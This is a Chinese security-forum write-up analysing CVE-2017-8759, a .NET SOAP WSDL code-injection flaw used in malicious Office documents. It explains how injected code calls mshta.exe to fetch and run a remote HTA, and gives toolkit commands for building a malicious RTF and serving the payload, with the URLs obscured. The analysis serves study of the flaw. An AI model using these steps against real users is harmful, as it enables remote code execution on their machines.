

# [原创] CVE-2017-8759 漏洞远程渗透利用分析

CVE-2017-8759 漏洞是由一个换行符引发的 0day 漏洞，该漏洞影响所有主流的 `.NET Framework` 版本。在 `.NET` 库中的 SOAP WSDL 解析模块 `IsValidUrl` 函数没有正确处理包含回车换行符的情况，导致调用者函数 `PrintClientProxy` 存在代码注入执行漏洞。该漏洞被用于 Office 文档高级威胁攻击。笔者在分析漏洞样本文件后，在局域网环境下实现了远程渗透，并进行了调试分析。

> 声明：该漏洞分析及利用过程仅作学习研究之用，由此产生的直接和间接后果作者概不负责。

## 0x02 样本分析

### 0x021 样本 1 分析

样本 1 由三个部分组成：`Doc1.doc`、`cmd.hta`、`exploit.txt`。使用 `WinHex` 打开 `Doc1.doc`，如图 1 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_n98fsj8edbwwive.jpg)

可以看到，`Doc1.doc` 中包含引用指定 URL 上文件的 SOAP WSDL 路径，引用的文件正好是 `exploit.txt`。打开该文件，如图 2 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_r5mp4dmsz02afc6.jpg)

可以看到，该文件是 XML 格式，有两个 `soap:address location`，且第二个 `soap:address location` 后面是回车换行，然后是要注入的代码。存在漏洞的 SOAP WSDL 解析模块 `IsValidUrl` 函数对 `soap:address location` 处理失误，导致后面的注入代码执行。

该代码使用 `System.Diagnostics.Process.Start` 方法调用 `mshta.exe`，加载指定 URL 上的 HTA 脚本。

使用 `notepad.exe` 打开 `cmd.hta`，如图 3 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_6qo2p6ewir3wutf.jpg)

该 HTA 文件使用 VBScript 脚本语言，利用 PowerShell 执行 `mspaint.exe`。

可以总结样本 1 的执行流程，如图 4 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_kicyceck3ot3198.jpg)

将 `exploit.txt` 和 `cmd.hta` 放到 IIS 服务器根目录 `wwwroot` 下，在本地计算机打开 `Doc1.doc`，如图 5 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_m8bucwo7jddpe9f.jpg)

注入代码得到执行，弹出了画图工具界面。

为了从二进制角度观察注入代码执行情况，使用 `OllyDbg` 附加到 Word 进程。由于使用的是 Word 2013，在 `OllyDbg` 的附加进程窗口找不到 `WINWORD.EXE`，尝试用 `OllyDbg` 直接打开安装目录下的 `WINWORD.EXE`，同样失败。但是在任务管理器中可以看到 `WINWORD.EXE`。至于为什么不能调试，一时找不到原因，可能是使用了反调试技术。

修改 `Doc1.doc` 中的 URL 为宿主机 IP，在虚拟机上打开 `Doc1.doc`，注入代码并没有得到执行。

### 0x022 样本 2 分析

样本 2 使用 GitHub 项目上的 `cve-2017-8759_toolkit.py` 生成。该工具包的语法如下。

#### 1. 生成恶意 RTF 文档

```bash
python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u 36aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0u0Q4x3X3f1K6i4K6u0r3k6i4S2H3L8r3!0A6N6q4)9J5k6i4c8^5N6l9`.`.
```

`-M` 表示模式，用于生成恶意 RTF 或进行 exploit；`gen` 表示生成恶意 RTF；`-w` 后面是 RTF 文档的名称；`-u` 后面是远程文档的路径（相对于目标机器），是一个 URL。

其中，`exploit.txt` 与样本 1 中的 `exploit.txt` 内容一样，是一个 SOAP XML 文件，即恶意 RTF 在目标机器上打开时链接的文件。

在命令提示符下运行上述命令，如图 6 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_5bndut9yjhg1tog.jpg)

可以看到，RTF 文件在 `Administrator` 文档下已经生成。

#### 2. Exploit

```bash
python cve-2017-8759_toolkit.py -M exp -e 0c7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0u0Q4x3X3f1K6i4K6u0r3j5$3#2V1i4K6u0W2K9s2c8S2 -l /tmp/cmd.hta
```

`-M` 表示模式，`exp` 表示进行 exploit；`-e` 后面是在目标机器上要执行的可执行文件或载荷的路径，是一个 URL。其中，`cmd.hta` 与样本 1 中的一样；`-l` 指定可执行文件或载荷的本地路径（服务器）。

在命令提示符下运行上述命令，如图 7 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_qfb2bllakqamc91.jpg)

可以看到，远程服务器正在 80 端口监听。

在目标机器上打开恶意 RTF，如图 8 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_em0ah2s6ed88ggc.jpg)

远程服务器上的注入代码得到执行。

## 0x03 调试分析

在虚拟机上运行 `WinDbg`，附加到 `WINWORD.EXT` 进程，输入 `g`，用 Word 打开 `Invoice.rtf` 样本文件，如图 9 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_40b5nzkhzgcspyg.jpg)

可以看到，目标机器的 Word 运行后加载了 `http10019241684243180800exploit4txt.dll` 模块，该 DLL 位于 `C:\Windows\SysWOW64\com\SOAPAssembly` 文件夹中。打开该文件夹，如图 10 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_ng80aywdndhi180.jpg)

该文件夹中有 `.cs` 源文件、以 `http[url]` 命令生成的 DLL 和符号文件。用 `Visual Studio 2010` 打开 `Logo.cs`，如图 11 所示。

![](https://bbs.kanxue.com/upload/attach/201709/717768_k6owj6zquoyga4g.jpg)

以上代码是目标机器上的 SOAP WSDL 模块解析远程服务器上的 SOAP XML 文件后生成的代码。生成的代码由 `.NET` 框架的 `csc.exe` 进行编译，生成 DLL 文件后被 Word 加载。

联系前面的分析，注入的代码使用 `System.Diagnostics.Process.Start` 方法调用 `mshta.exe`，加载指定 URL 上的 HTA 脚本。

## 0x04 总结

本文首先分析了两个漏洞利用样本，并在虚拟机上进行远程渗透利用，搞清楚了漏洞利用的流程。

同时，结合目标机器上的动态调试，定位到了在目标机器上生成的 C# 源文件，进一步分析清楚了远程服务器上的恶意注入代码在目标机器上发生作用的机理：即在目标机器上生成了包含恶意注入的代码，经目标机器上的 `csc.exe` 编译后生成 DLL 文件，最终被 Word 可执行文件加载，完成了漏洞的利用。
